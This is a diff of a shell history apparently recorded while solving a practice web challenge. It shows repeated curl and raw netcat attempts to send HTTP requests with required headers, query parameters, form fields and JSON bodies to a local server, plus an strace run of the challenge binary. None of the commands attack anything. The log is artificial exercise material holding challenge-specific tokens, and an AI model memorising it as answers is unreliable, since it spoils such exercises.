- 1631  echo -e "POST /path HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: 127\r\nConnection: close\r\n\r\n{\"a\":\"76ffd814d9a09d2c0c20bcbca70b8e00\", \"b\":\"{'c': '1132c731', 'd': ['3a836ecf', '6de4bf46 e7af746d&7f470465#7696ca89']}\"}" | nc 127.0.0.1 80
- 1632  echo -e "POST /path HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: 14\r\nConnection: close\r\n\r\n{\"a\":\"76ffd814d9a09d2c0c20bcbca70b8e00\", \"b\":\"{'c': '1132c731', 'd': ['3a836ecf', '6de4bf46 e7af746d&7f470465#7696ca89']}\"}" | nc 127.0.0.1 80
- 1633  echo -e "POST /path HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: 124\r\nConnection: close\r\n\r\n{\"a\":\"76ffd814d9a09d2c0c20bcbca70b8e00\", \"b\":\"{'c': '1132c731', 'd': ['3a836ecf', '6de4bf46 e7af746d&7f470465#7696ca89']}\"}" | nc 127.0.0.1 80
- 1634  echo -e "POST /path HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: 124\r\nConnection: close\r\n\r\n{\"a\":\"76ffd814d9a09d2c0c20bcbca70b8e00\", \"b\":{'c': '1132c731', 'd': ['3a836ecf', '6de4bf46 e7af746d&7f470465#7696ca89']}" | nc 127.0.0.1 80
- 1635  echo -e "POST /path HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: 120\r\nConnection: close\r\n\r\n{\"a\":\"76ffd814d9a09d2c0c20bcbca70b8e00\", \"b\":{'c': '1132c731', 'd': ['3a836ecf', '6de4bf46 e7af746d&7f470465#7696ca89']}" | nc 127.0.0.1 80
- 1636  echo -e "POST /path HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: 122\r\nConnection: close\r\n\r\n{\"a\":\"76ffd814d9a09d2c0c20bcbca70b8e00\", \"b\":{'c': '1132c731', 'd': ['3a836ecf', '6de4bf46 e7af746d&7f470465#7696ca89']}" | nc 127.0.0.1 80
- 1637  echo -e "POST /path HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: 121\r\nConnection: close\r\n\r\n{\"a\":\"76ffd814d9a09d2c0c20bcbca70b8e00\", \"b\":{'c': '1132c731', 'd': ['3a836ecf', '6de4bf46 e7af746d&7f470465#7696ca89']}" | nc 127.0.0.1 80
- 1638  echo -e "POST /path HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: 121\r\nConnection: close\r\n\r\n{\"a\":\"76ffd814d9a09d2c0c20bcbca70b8e00\", \"b\":{'c': '1132c731', 'd': ['3a836ecf', '6de4bf46 e7af746d&7f470465#7696ca89']}"
- 1639  echo -e "POST / HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: 121\r\nConnection: close\r\n\r\n{\"a\":\"76ffd814d9a09d2c0c20bcbca70b8e00\", \"b\":{'c': '1132c731', 'd': ['3a836ecf', '6de4bf46 e7af746d&7f470465#7696ca89']}"
- 1640  echo -e "POST / HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: 121\r\nConnection: close\r\n\r\n{\"a\":\"76ffd814d9a09d2c0c20bcbca70b8e00\", \"b\":{'c': '1132c731', 'd': ['3a836ecf', '6de4bf46 e7af746d&7f470465#7696ca89']}" | nc 127.0.0.1 80
- 1641  echo -e "POST / HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: 122\r\nConnection: close\r\n\r\n{\"a\":\"76ffd814d9a09d2c0c20bcbca70b8e00\", \"b\":{'c': '1132c731', 'd': ['3a836ecf', '6de4bf46 e7af746d&7f470465#7696ca89']}" | nc 127.0.0.1 80
- 1642  echo -e "POST / HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: 120\r\nConnection: close\r\n\r\n{\"a\":\"76ffd814d9a09d2c0c20bcbca70b8e00\", \"b\":{'c': '1132c731', 'd': ['3a836ecf', '6de4bf46 e7af746d&7f470465#7696ca89']}" | nc 127.0.0.1 80
- 1643  history > ttt.out
+  999  sudo cat ./ttt.out | strace /challenge/toddlerone_level11.0 
+ 1000  ipython
+ 1001  sudo cat ./ttt.out | strace /challenge/toddlerone_level11.0 
+ 1002  ipython
+ 1003  sudo cat ./ttt.out | strace /challenge/toddlerone_level11.0 
+ 1004  ipython
+ 1005  sudo cat ./ttt.out | strace /challenge/toddlerone_level11.0 
+ 1006  ipython
+ 1007  sudo cat ./ttt.out | strace /challenge/toddlerone_level11.0 
+ 1008  ipython
+ 1009  sudo cat ./ttt.out | strace /challenge/toddlerone_level11.0 
+ 1010  ipython
+ 1011  sudo cat ./ttt.out | strace /challenge/toddlerone_level11.0 
+ 1012  sudo
+ 1013  sudo -i
+ 1014  sudo cat ./ttt.out | sudo strace /challenge/toddlerone_level11.0 
+ 1015  ipython
+ 1016  curl 127.0.0.1
+ 1017  nc 127.0.0.1
+ 1018  nc 127.0.0.1 -p 80
+ 1019  nc =p 80 127.0.0.1 
+ 1020  nc -p 80 127.0.0.1 
+ 1021  nc 127.0.0.1 :80
+ 1022  nc 127.0.0.1:80
+ 1023  nc 127.0.0.1 80
+ 1024  nc 127.0.0.1 8080
+ 1025  nc 127.0.0.1 1234
+ 1026  nc 127.0.0.1 80
+ 1027  curl -H "Host: example.com" -H "Accept: application/json" http://127.0.0.1
+ 1028  curl  -H "Accept: application/json" http://127.0.0.1
+ 1029  curl  -H "Accept: application/json" http://127.0.0.1：80
+ 1030  curl  -H "Accept: application/json" http://127.0.0.1:80
+ 1031  curl -H "Host: example.com" -H "Content-Type: application/json" -d '{"key":"value"}' -X POST http://127.0.0.1
+ 1032  curl -H "Host: 127.0.0.1" -H "Content-Type: application/json" -d '{"key":"value"}' -X POST http://127.0.0.1
+ 1033  curl -H "Host: example.com" 127.0.0.1
+ 1034  curl -H "Host: cdebbef7592a620af98479e08a0d7210" 127.0.0.1
+ 1035  echo -e "GET / HTTP/1.1\r\nHost: example.com\r\nConnection: close\r\n\r\n" | nc 127.0.0.1 80
+ 1036  echo -e "GET / HTTP/1.1\r\nHost: 8a0c24f69a268a732b291e4ad604ec83\r\nConnection: close\r\n\r\n" | nc 127.0.0.1 80
+ 1037  import requests
+ 1038  # The URL you want to send the request to
+ 1039  url = 'http://127.0.0.1'
+ 1040  # Custom headers
+ 1041  headers = {
+ 1042  }
+ 1043  # Send a GET request
+ 1044  response = requests.get(url, headers=headers)
+ 1045  # Check the status code of the response
+ 1046  if response.status_code == 200:;     print('Success!')
+ 1047  else:
+ 1048  # Print the content of the response
+ 1049  print(response.text)
+ 1050  echo -e "GET / HTTP/1.1\r\nHost: 8a0c24f69a268a732b291e4ad604ec83\r\nConnection: close\r\n\r\n" | nc 127.0.0.1 80
+ 1051  ipython
+ 1052  curl -H "Host: cdebbef7592a620af98479e08a0d7210" 127.0.0.1
+ 1053  curl -H "Host: cdebbef7592a620af98479e08a0d7210" 127.0.0.1/37fbdcb0b3cbf8073d2c115f0cb617e9
+ 1054  echo -e "GET / HTTP/1.1\r\nHost: 8a0c24f69a268a732b291e4ad604ec83\r\nConnection: close\r\n\r\n" | nc 127.0.0.1/ 80
+ 1055  echo -e "GET / HTTP/1.1\r\nHost: 8a0c24f69a268a732b291e4ad604ec83\r\nConnection: close\r\n\r\n" | nc 127.0.0.1 80
+ 1056  echo -e "GET /8d83bc12c19ff218bade080ef19799d0 HTTP/1.1\r\nHost: example.com\r\nConnection: close\r\n\r\n" | nc example.com 80
+ 1057  echo -e "GET //8d83bc12c19ff218bade080ef19799d0 HTTP/1.1\r\nHost: 8a0c24f69a268a732b291e4ad604ec83\r\nConnection: close\r\n\r\n" | nc 127.0.0.1 80
+ 1058  ipython
+ 1059  curl -H "Host: cdebbef7592a620af98479e08a0d7210" 127.0.0.1/37fbdcb0b3cbf8073d2c115f0cb617e9
+ 1060  curl -H "Host: cdebbef7592a620af98479e08a0d7210" "127.0.0.1//69ebed39 e0d7d556/d7b70214 9182bc23"
+ 1061  curl -H "Host: cdebbef7592a620af98479e08a0d7210" "127.0.0.1//69ebed39%20e0d7d556/d7b70214%209182bc23"
+ 1062  echo -e "GET //8d83bc12c19ff218bade080ef19799d0 HTTP/1.1\r\nHost: 8a0c24f69a268a732b291e4ad604ec83\r\nConnection: close\r\n\r\n" | nc 127.0.0.1 80
+ 1063  echo -e "GET /0f9fe7f8%20d2caa070/8af005e2%206729df4e HTTP/1.1\r\nHost: 8a0c24f69a268a732b291e4ad604ec83\r\nConnection: close\r\n\r\n" | nc 127.0.0.1 80
+ 1064  curl 127.0.0.1
+ 1065  curl -H "Host: cdebbef7592a620af98479e08a0d7210" "127.0.0.1//69ebed39%20e0d7d556/d7b70214%209182bc23"
+ 1066  curl -H "Content-Type: application/json" -d '{"a":"9c9010633f8f6f657749d31471626b07"}' http://127.0.0.1
+ 1067  curl -H "Content-Type: application/json" -F "a=9c9010633f8f6f657749d31471626b07" http://127.0.0.1
+ 1068  curl -F "a=9c9010633f8f6f657749d31471626b07" http://127.0.0.1
+ 1069  curl -F "a=9c9010633f8f6f657749d31471626b07" http://127.0.0.1?a=9c9010633f8f6f657749d31471626b07
+ 1070  echo -e "GET /?a= HTTP/1.1\r\nHost: 8a0c24f69a268a732b291e4ad604ec83\r\nConnection: close\r\n\r\n" | nc 127.0.0.1 80
+ 1071  echo -e "GET /?a=6712b31cf45e611180886f41430d7fc1 HTTP/1.1\r\nHost: 8a0c24f69a268a732b291e4ad604ec83\r\nConnection: close\r\n\r\n" | nc 127.0.0.1 80
+ 1072  curl -H "Content-Type: application/json" -d '{"param1": "value1", "param2": "value2", "param3": "value3"}' http://example.com/resource
+ 1073  curl -H "Content-Type: application/json" -d '{"param1": "value1", "param2": "value2", "param3": "value3"}' http://127.0.0.1
+ 1074  curl -H "Content-Type: application/json" -d '{"param1": "value1", "param2": "value2", "a": "cf1d40cf99c877446cd2f468b64de27e"}' http://127.0.0.1
+ 1075  curl -F "a=9c9010633f8f6f657749d31471626b07" http://127.0.0.1?a=cf1d40cf99c877446cd2f468b64de27e
+ 1076  curl -F "a=9c9010633f8f6f657749d31471626b07" http://127.0.0.1?a=cf1d40cf99c877446cd2f468b64de27e?b=816387d5%209e3abf04&adae132f#95650956
+ 1077  curl -F "a=9c9010633f8f6f657749d31471626b07" http://127.0.0.1?a=cf1d40cf99c877446cd2f468b64de27e?b=816387d5%209e3abf04%26adae132f#95650956
+ 1078  curl -F "a=9c9010633f8f6f657749d31471626b07" http://127.0.0.1?a=cf1d40cf99c877446cd2f468b64de27e%26b=816387d5%209e3abf04%26adae132f#95650956
+ 1079  ipython
+ 1080  curl -F "a=9c9010633f8f6f657749d31471626b07" http%3A127.0.0.1/%3Fa%3Dcf1d40cf99c877446cd2f468b64de27e%26b%3D816387d5%25209e3abf04%26adae132f%2395650956
+ 1081  curl -F "a=9c9010633f8f6f657749d31471626b07" http://127.0.0.1/%3Fa%3Dcf1d40cf99c877446cd2f468b64de27e%26b%3D816387d5%25209e3abf04%26adae132f%2395650956
+ 1082  curl -F "a=9c9010633f8f6f657749d31471626b07" http://127.0.0.1/?a=cf1d40cf99c877446cd2f468b64de27e&b=816387d5%25209e3abf04%26adae132f%2395650956
+ 1083  curl -F "a=9c9010633f8f6f657749d31471626b07" "http://127.0.0.1/?a=cf1d40cf99c877446cd2f468b64de27e&b=816387d5%25209e3abf04%26adae132f%2395650956"
+ 1084  curl --get --data-urlencode "a=" --data-urlencode "b=value2" --data-urlencode "param3=value3" "http://127.0.0.1"
+ 1085  curl --get --data-urlencode "a=cf1d40cf99c877446cd2f468b64de27e" --data-urlencode "b=value2" --data-urlencode "param3=value3" "http://127.0.0.1"
+ 1086  curl --get --data-urlencode "a=cf1d40cf99c877446cd2f468b64de27e" --data-urlencode "b=816387d5 9e3abf04&adae132f#95650956" --data-urlencode "param3=value3" "http://127.0.0.1"
+ 1087  echo -e "GET /path?arg1=value1&arg2=value2 HTTP/1.1\nHost: example.com\n\n" | nc 127.0.0.1 80
+ 1088  echo -e "GET /?a=28d7d0f6c9bf6acf4374b3a1dd19a227&arg2=value2 HTTP/1.1\nHost: example.com\n\n" | nc 127.0.0.1 80
+ 1089  echo -e "GET /?a=28d7d0f6c9bf6acf4374b3a1dd19a227&arg2=cf8571bb 4026ba7c&6989591e#c2459f05 HTTP/1.1\nHost: example.com\n\n" | nc 127.0.0.1 80
+ 1090  echo -e "GET /?a=28d7d0f6c9bf6acf4374b3a1dd19a227&b=cf8571bb 4026ba7c&6989591e#c2459f05 HTTP/1.1\nHost: example.com\n\n" | nc 127.0.0.1 80
+ 1091  echo -e "GET /?a=28d7d0f6c9bf6acf4374b3a1dd19a227&b=cf8571bb%204026ba7c%266989591e%23c2459f05 HTTP/1.1\nHost: example.com\n\n" | nc 127.0.0.1 80
+ 1092  curl -F "key1=value1" -F "key2=value2" -F "file=@/path/to/file.txt" http://127.0.0.1
+ 1093  curl -F "key1=value1" -F "key2=value2" http://127.0.0.1
+ 1094  curl -F "a=9326f1a32868fbac1dc8397a59d0a7ba" -F "key2=value2" http://127.0.0.1
+ 1095  echo -e "POST /path HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 27\r\nConnection: close\r\n\r\nkey1=value1&key2=value2" | nc 127.0.0.1 80
+ 1096  echo -e "POST /path HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Length: 228\r\nConnection: close\r\n\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; name=\"file\"; filename=\"file.txt\"\r\nContent-Type: text/plain\r\n\r\nfile content\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW--" | nc 127.0.0.1 80
+ 1097  echo -e "GET /?a=28d7d0f6c9bf6acf4374b3a1dd19a227&b=cf8571bb%204026ba7c%266989591e%23c2459f05 HTTP/1.1\nHost: example.com\n\n" | nc 127.0.0.1 80
+ 1098  echo -e "POST /path HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: multipart/form-data; a=24530f04e6c7fb7d04d059973d804627\r\nContent-Type: text/plain\r\n\r\nfile content\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW--" | nc 127.0.0.1 80
+ 1099  echo -e "POST /path HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 27\r\nConnection: close\r\n\r\na=24530f04e6c7fb7d04d059973d804627" | nc 127.0.0.1 80
+ 1100  echo -e "POST /path HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 34\r\nConnection: close\r\n\r\na=24530f04e6c7fb7d04d059973d804627" | nc 127.0.0.1 80
+ 1101  curl -F "a=9326f1a32868fbac1dc8397a59d0a7ba" -F "key2=value2" http://127.0.0.1
+ 1102  curl -F "a=5e0574f48a7c9f6a6dd36921c6b6b45e" -F "key2=value2" http://127.0.0.1
+ 1103  curl -F "a=5e0574f48a7c9f6a6dd36921c6b6b45e" -F "key2=8dc3460c%207b9bdc4d%2613f96c76%235a96cb35" http://127.0.0.1
+ 1104  curl -F "a=5e0574f48a7c9f6a6dd36921c6b6b45e" -F "b=8dc3460c%207b9bdc4d%2613f96c76%235a96cb35" http://127.0.0.1
+ 1105  curl -F "a=5e0574f48a7c9f6a6dd36921c6b6b45e" -F "b=8dc3460c 7b9bdc4d&13f96c76#5a96cb35" http://127.0.0.1
+ 1106  echo -e "POST /path HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 100\r\nConnection: close\r\n\r\na=24530f04e6c7fb7d04d059973d804627&b=c" | nc 127.0.0.1 80
+ 1107  echo -e "POST /path HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 27\r\nConnection: close\r\n\r\na=24530f04e6c7fb7d04d059973d804627&b=c" | nc 127.0.0.1 80
+ 1108  echo -e "POST /path HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 27\r\nConnection: close\r\n\r\na=f43d1f6f89a80ec60417c35af4e3407a&b=c" | nc 127.0.0.1 80
+ 1109  echo -e "POST /path HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 50\r\nConnection: close\r\n\r\na=f43d1f6f89a80ec60417c35af4e3407a&b=c" | nc 127.0.0.1 80
+ 1110  echo -e "POST /path HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 40\r\nConnection: close\r\n\r\na=f43d1f6f89a80ec60417c35af4e3407a&b=c" | nc 127.0.0.1 80
+ 1111  echo -e "POST /path HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 34\r\nConnection: close\r\n\r\na=f43d1f6f89a80ec60417c35af4e3407a&b=c" | nc 127.0.0.1 80
+ 1112  echo -e "POST /path HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 34\r\nConnection: close\r\n\r\na=f43d1f6f89a80ec60417c35af4e3407a&b=b46182ad 2fedfa1a&a8845ddf#f97a25aa" | nc 127.0.0.1 80
+ 1113  echo -e "POST /path HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 40\r\nConnection: close\r\n\r\na=f43d1f6f89a80ec60417c35af4e3407a&b=b46182ad 2fedfa1a&a8845ddf#f97a25aa" | nc 127.0.0.1 80
+ 1114  echo -e "POST /path HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 72\r\nConnection: close\r\n\r\na=f43d1f6f89a80ec60417c35af4e3407a&b=b46182ad 2fedfa1a&a8845ddf#f97a25aa" | nc 127.0.0.1 80
+ 1115  echo -e "POST /path HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 95\r\nConnection: close\r\n\r\na=f43d1f6f89a80ec60417c35af4e3407a&b=b46182ad 2fedfa1a&a8845ddf#f97a25aa" | nc 127.0.0.1 80
+ 1116  echo -e "POST /path HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 90\r\nConnection: close\r\n\r\na=f43d1f6f89a80ec60417c35af4e3407a&b=b46182ad 2fedfa1a&a8845ddf#f97a25aa" | nc 127.0.0.1 80
+ 1117  echo -e "POST /path HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 85\r\nConnection: close\r\n\r\na=f43d1f6f89a80ec60417c35af4e3407a&b=b46182ad 2fedfa1a&a8845ddf#f97a25aa" | nc 127.0.0.1 80
+ 1118  echo -e "POST /path HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 82\r\nConnection: close\r\n\r\na=f43d1f6f89a80ec60417c35af4e3407a&b=b46182ad 2fedfa1a&a8845ddf#f97a25aa" | nc 127.0.0.1 80
+ 1119  echo -e "POST /path HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 76\r\nConnection: close\r\n\r\na=f43d1f6f89a80ec60417c35af4e3407a&b=b46182ad 2fedfa1a&a8845ddf#f97a25aa" | nc 127.0.0.1 80
+ 1120  echo -e "POST /path HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 72\r\nConnection: close\r\n\r\na=f43d1f6f89a80ec60417c35af4e3407a&b=b46182ad 2fedfa1a&a8845ddf#f97a25aa" | nc 127.0.0.1 80
+ 1121  echo -e "POST /path HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 72\r\nConnection: close\r\n\r\na=f43d1f6f89a80ec60417c35af4e3407a&b=b46182ad 2fedfa1a%26a8845ddf#f97a25aa" | nc 127.0.0.1 80
+ 1122  echo -e "POST /path HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 74\r\nConnection: close\r\n\r\na=f43d1f6f89a80ec60417c35af4e3407a&b=b46182ad 2fedfa1a%26a8845ddf#f97a25aa" | nc 127.0.0.1 80
+ 1123  curl -H "Content-Type: application/json" -d '{"key1":"value1", "key2":"value2"}' http://127.0.0.1/resource
+ 1124  curl -H "Content-Type: application/json" -d '{"key1":"ea4a344f52b43f62880c8340c6add549", "key2":"value2"}' http://127.0.0.1/resource
+ 1125  curl -H "Content-Type: application/json" -d '{"a":"ea4a344f52b43f62880c8340c6add549", "key2":"value2"}' http://127.0.0.1/resource
+ 1126  echo -e "POST /path HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: 34\r\nConnection: close\r\n\r\n{\"key1\":\"value1\", \"key2\":\"value2\"}" | nc 127.0.0.1 80
+ 1127  echo -e "POST /path HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: 34\r\nConnection: close\r\n\r\n{\"key1\":\"998601274c926de3a6e92a4f1dced7d5\", \"key2\":\"value2\"}" | nc 127.0.0.1 80
+ 1128  echo -e "POST /path HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: 54\r\nConnection: close\r\n\r\n{\"key1\":\"998601274c926de3a6e92a4f1dced7d5\", \"key2\":\"value2\"}" | nc 127.0.0.1 80
+ 1129  echo -e "POST /path HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: 60\r\nConnection: close\r\n\r\n{\"key1\":\"998601274c926de3a6e92a4f1dced7d5\", \"key2\":\"value2\"}" | nc 127.0.0.1 80
+ 1130  echo -e "POST /path HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: 57\r\nConnection: close\r\n\r\n{\"a\":\"998601274c926de3a6e92a4f1dced7d5\", \"key2\":\"value2\"}" | nc 127.0.0.1 80
+ 1131  curl -H "Content-Type: application/json" -d '{
+ 1132      "name": "John Doe",
+ 1133      "age": 30,
+ 1134      "address": {
+ 1135          "street": "123 Main St",
+ 1136          "city": "Anytown",
+ 1137          "state": "CA",
+ 1138          "zip": "12345"
+ 1139      },
+ 1140      "hobbies": ["reading", "hiking", "coding"]
+ 1141  }' http://127.0.0.1/resource
+ 1142  curl -H "Content-Type: application/json" -d '{
+ 1143      
+ 1144  }' http://127.0.0.1/resource
+ 1145  curl -H "Content-Type: application/json" -d '{
+ 1146  "a" : "a1a250aee832d2a326b3c1e2561b99b1"    
+ 1147  }' http://127.0.0.1/resource
+ 1148  curl -H "Content-Type: application/json" -d '{
+ 1149  "a" : "a1a250aee832d2a326b3c1e2561b99b1","b":"{'c': '64d4a626', 'd': ['9a35362a', '8b77a569 26852b65&69200f16#7c000827']}"   
+ 1150  }' http://127.0.0.1/resource
+ 1151  curl -H "Content-Type: application/json" -d '{
+ 1152  "a" : "a1a250aee832d2a326b3c1e2561b99b1","b":{'c': '64d4a626', 'd': ['9a35362a', '8b77a569 26852b65&69200f16#7c000827']}
+ 1153  }' http://127.0.0.1/resource
+ 1154  curl -H "Content-Type: application/json" -d '{
+ 1155  "a" : "a1a250aee832d2a326b3c1e2561b99b1","b":{'c': '64d4a626', 'd': ['9a35362a', '8b77a569 26852b65\&69200f16#7c000827']}
+ 1156  }' http://127.0.0.1/resource
+ 1157  curl -H "Content-Type: application/json" -d '{
+ 1158  "a" : "a1a250aee832d2a326b3c1e2561b99b1","b":{'c': '64d4a626', 'd': ['9a35362a', '8b77a569 26852b65%2669200f16#7c000827']}
+ 1159  }' http://127.0.0.1/resource
+ 1160  curl -H "Content-Type: application/json" -d '{
+ 1161  "a" : "a1a250aee832d2a326b3c1e2561b99b1","b":{'c': '64d4a626', 'd': ['9a35362a', '8b77a569 26852b65&69200f16#7c000827']}
+ 1162  }' http://127.0.0.1/resource
+ 1163  curl -H "Content-Type: application/json" -d '{
+ 1164  "a" : "a1a250aee832d2a326b3c1e2561b99b1","b":{'c': '64d4a626', 'd': ['9a35362a', '8b77a569 26852b65%2669200f16#7c000827']}
+ 1165  }' http://127.0.0.1/resource
+ 1166  curl -H "Content-Type: application/json" -d '{
+ 1167  "a" : "a1a250aee832d2a326b3c1e2561b99b1","b":"{'c': '64d4a626', 'd': ['9a35362a', '8b77a569 26852b65%2669200f16#7c000827']}"
+ 1168  }' http://127.0.0.1/resource
+ 1169  curl -H "Content-Type: application/json" -d '{
+ 1170  "a" : "a1a250aee832d2a326b3c1e2561b99b1","b":"{'c': '64d4a626', 'd': ['9a35362a', '8b77a569 26852b65&69200f16#7c000827']}"
+ 1171  }' http://127.0.0.1/resource
+ 1172  curl -H "Content-Type: application/json" -d '{
+ 1173  "a" : "a1a250aee832d2a326b3c1e2561b99b1","b":"{'c': '64d4a626', 'd': ['9a35362a', '8b77a569 26852b65&69200f16#7c000827']}"
+ 1174  }' http://127.0.0.1/resource
+ 1175  curl -H "Content-Type: application/json" -d '{"a" : "a1a250aee832d2a326b3c1e2561b99b1","b":"{'c': '64d4a626', 'd': ['9a35362a', '8b77a569 26852b65&69200f16#7c000827']}"}' http://127.0.0.1/resource
+ 1176  exit
+ 1177  curl -H "Content-Type: application/json" -d '{"key1":"ea4a344f52b43f62880c8340c6add549", "key2":"value2"}' http://127.0.0.1/resource
+ 1178  curl -H "Content-Type: application/json" -d '{"a":"a1a250aee832d2a326b3c1e2561b99b1", "key2":"value2"}' http://127.0.0.1/resource
+ 1179  curl -H "Content-Type: application/json" -d '{"a":"a1a250aee832d2a326b3c1e2561b99b1", "b":{'c': '64d4a626', 'd': ['9a35362a', '8b77a569 26852b65\&69200f16#7c000827']}}' http://127.0.0.1/resource
+ 1180  curl -H "Content-Type: application/json" -d '{"a":"a1a250aee832d2a326b3c1e2561b99b1", "b":{'c': '64d4a626', 'd': ['9a35362a', '8b77a569 26852b65%2669200f16#7c000827']}}' http://127.0.0.1/resource
+ 1181  curl -H "Content-Type: application/json" -d '{"a":"a1a250aee832d2a326b3c1e2561b99b1", "b":{'c': '64d4a626', 'd': ['9a35362a', '8b77a569\ 26852b65&69200f16#7c000827']}}' http://127.0.0.1/resource
+ 1182  curl -H "Content-Type: application/json" -d '{"a":"a1a250aee832d2a326b3c1e2561b99b1", "b":{'c': '64d4a626', 'd': ['9a35362a', '8b77a569%2026852b65%2669200f16#7c000827']}}' http://127.0.0.1/resource
+ 1183  curl -H "Content-Type: application/json" -d '{"a":"a1a250aee832d2a326b3c1e2561b99b1", "b":"{'c': '64d4a626', 'd': ['9a35362a', '8b77a569%2026852b65%2669200f16#7c000827']}"}' http://127.0.0.1/resource
+ 1184  curl -H "Content-Type: application/json" -d '{"a":"a1a250aee832d2a326b3c1e2561b99b1", "b":{'c': '64d4a626', 'd': ['9a35362a', '8b77a569 26852b65\&69200f16#7c000827']}}' http://127.0.0.1/resource
+ 1185  curl -H "Content-Type: application/json" -d '{"a":"a1a250aee832d2a326b3c1e2561b99b1", "b":{'c': '64d4a626', 'd': ['9a35362a', '8b77a569\ 26852b65\&69200f16#7c000827']}}' http://127.0.0.1/resource
+ 1186  curl -H "Content-Type: application/json" -d '{"a":"a1a250aee832d2a326b3c1e2561b99b1", "b":{'c': '64d4a626', 'd': ['9a35362a', '8b77a569\ 26852b65\&69200f16#7c000827']}}' http://127.0.0.1
+ 1187  clear
+ 1188  curl -H "Content-Type: application/json" -d '{"a":"a1a250aee832d2a326b3c1e2561b99b1", "b":{'c': '64d4a626', 'd': ['9a35362a', '8b77a569\ 26852b65\&69200f16#7c000827']}}' http://127.0.0.1
+ 1189  curl -H "Content-Type: application/json" -d '{"key":"value with &"}' http://127.0.0.1/resource
+ 1190  curl -H "Content-Type: application/json" -d '{"a":"value with &"}' http://127.0.0.1/resource
+ 1191  curl -H "Content-Type: application/json" -d '{"a":"a1a250aee832d2a326b3c1e2561b99b1", "b":{'c': '64d4a626', 'd': ['9a35362a', "8b77a569\ 26852b65&69200f16#7c000827"]}}' http://127.0.0.1
+ 1192  curl -H "Content-Type: application/json" -d '{"a":"a1a250aee832d2a326b3c1e2561b99b1", "b":{'c': '64d4a626', 'd': ['9a35362a', "8b77a569 26852b65&69200f16#7c000827"]}}' http://127.0.0.1
+ 1193  curl -H "Content-Type: application/json" -d '{"a":"a1a250aee832d2a326b3c1e2561b99b1", "b":{"c": "64d4a626", "d": ["9a35362a", "8b77a569 26852b65&69200f16#7c000827"]}}' http://127.0.0.1
+ 1194  echo -e "POST /path HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: 57\r\nConnection: close\r\n\r\n{\"a\":\"998601274c926de3a6e92a4f1dced7d5\", \"key2\":\"value2\"}" | nc 127.0.0.1 80
+ 1195  echo -e "POST /path HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: 57\r\nConnection: close\r\n\r\n{\"a\":\"76ffd814d9a09d2c0c20bcbca70b8e00\", \"key2\":\"value2\"}" | nc 127.0.0.1 80
